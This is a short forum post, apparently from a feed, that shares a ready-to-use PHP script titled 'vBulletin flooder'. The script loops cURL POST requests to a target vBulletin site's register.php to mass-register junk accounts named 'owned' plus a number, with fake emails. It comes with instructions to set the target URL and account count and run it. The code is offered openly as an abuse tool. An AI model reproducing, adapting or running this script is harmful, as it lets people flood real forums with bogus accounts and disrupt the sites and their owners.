It’s not free, that’s why smfforfree is so popular, you understand?

I wouldn’t like to freak out their site at all.

item.title: vBulletin flooder
item.dc:creator: @ilyaostr9 io9
item.description:
@ilyaostr9 wrote:

You’ll need cURL for this, btw. Just copy to a PHP-ready server, change $flooddir and $floodamount and you’re set!

[php]<?

$flooddir = ‘http://website.to/flood’; // vBulletin to flood - WITHOUT THE “/” AT THE END
$floodamount = 100; // amount of users to create

set_time_limit(300);

for($i = 1 ; $i <= $floodamount ; $i++)

{
$ch = curl_init();

curl_setopt($ch , CURLOPT_URL , $flooddir.’/register.php’);

curl_setopt($ch , CURLOPT_POST , 1) ;

curl_setopt($ch , CURLOPT_POSTFIELDS ,
‘agree=1&s=&do=addmember&url=index.php&password_md5=&passwordconfirm_md5=&day=0&month=0&year=0&username=owned’.$i.’&password=owned&passwordconfirm=owned&email=owned’.$i.’@owned.com&emailconfirm=owned’.$i.’@owned.com&referrername=&timezoneoffset=(GMT -12:00)Eniwetok, Kwajalein&dst=DST corrections alwayson&options[showemail]=1’);

curl_exec($ch);

curl_close($ch);

}

?>[/php]

Read full topic
